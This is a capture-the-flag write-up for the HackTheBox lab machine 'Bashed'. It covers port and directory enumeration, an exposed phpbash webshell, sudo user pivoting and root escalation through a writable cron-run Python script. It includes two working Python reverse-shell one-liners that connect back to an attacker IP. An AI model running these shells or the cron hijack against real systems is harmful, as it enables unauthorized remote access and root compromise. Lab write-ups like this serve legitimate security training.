#box #webshell #cron
Bashed is a box that exercise in a really balanced way concepts of enumeration, shells and basic methods to perform a privilege escalation

## Nmap

Within Nmap, we discover only the existing of a webserver running on port 80

```bash
# Nmap 7.95 scan initiated Sun Mar 30 21:19:07 2025 as: /usr/lib/nmap/nmap -sC -sV --min-rate=10000 -o nmap_sCsV 10.129.32.92
Nmap scan report for 10.129.32.92
Host is up (0.053s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 30 21:19:15 2025 -- 1 IP address (1 host up) scanned in 8.41 seconds
```

## :80

Once on port 80 we discover a website, by analyzing its source we do not discover a lot information if not the usual references, however the homepage of the website, if well written, highlights the existence of [phpbash](https://github.com/Arrexel/phpbash), a known webshell, somewhere in the webserver.
We start an enumeration `s` , discovering the existence of the following reachable endpoint:
```bash
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.31.189/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7743
________________________________________________

images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 68ms]
uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 32ms]
php                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 50ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 48ms]
dev                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 47ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 47ms]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 47ms]
```

`/dev` seems a quite interesting path to look at and in fact, on it we discover the existence of both `phpbash.php` and `phpbash.min.php`

![[attachments/bashed-writeup-1.webp]]

## Getting a Shell

We try to leverage `phpbash.min.php` webshell to get a reverse shell on the system. After trying a php one, we decide to opt for a python one, we opt for the shortest one found on [revshells](https://www.revshells.com/) obtaining the shell.

```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.16.35",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

## User Impersonation

After transitioning into a Fully Interactive TTY with:
```bash
# In Reverse Shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
stty raw -echo
fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <rows> columns <cols>
```

The first command that we execute is `sudo -l` to verify which capability our user has and discover that the current user can impersonate the user `scriptmanager`. Due to the capability provided, the user can be impersonated with sudo powers.

```bash
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

To impersonate the user we can use:

```bash
sudo -u scriptmanager /bin/bash
```

We'll be now using the machine as `scriptmanager`.

## Privilege Escalation

By leveraging the command [[Finding Files#File Owned by an user|File Owned by an user]] and by adding the `/proc` and `/dev` folders exclusion, we end up finding a few available files left on which we have ownership. The final command is: ^nyjnj9

```bash
find / -user scriptmanager 2>/dev/null | grep -v '^/run\|^/prov\|^/sys\|^/proc\|^/dev'

# And results in

/scripts
/scripts/test.py
/home/scriptmanager
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.nano
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout
```

Except for the system files related to nano / bash, we notice the presence of a `/scripts` folder.
Heading into it, we discover the existence of two files:
* `test.py` on which we are owner
* `test.txt` on which `root` is the owner

`test.py` contains the following content, and seems to be attempting to write a string inside `test.txt`

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

We replace the content of test.py with a reverse shell on port `4444` and launch netcat on our end `nc -lvnp 4444`

```python
import os,pty,socket;s=socket.socket();s.connect(("10.10.16.35",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")
```

We do not obtain a shell instantly, but patiently waiting for a minute leads us there, letting us catch the `root` session on Bashed. This is due to the fact that test.py is executed every minute by the system.
## Post-Escalation

Discovering how this escalation was possible can be done by looking at the cron jobs available at `/var/spool/cron`. Inside that folder we can find another folder called `/crontabs` and inside of it a job called `root`.
If we print the content of the cron jobs, we discover the following:

```bash
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.igz05b/crontab installed on Mon Dec  4 17:53:17 2017)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
* * * * * cd /scripts; for f in *.py; do python "$f"; done
```

Literally, this cronjob does:
* cd into `/scripts` folder
* Iterates on all the `.py` files of the folder and `do` (executes) the file content within `python`
This means that whatever command is written inside of any `.py` file in `/scripts` will be executed every minute.

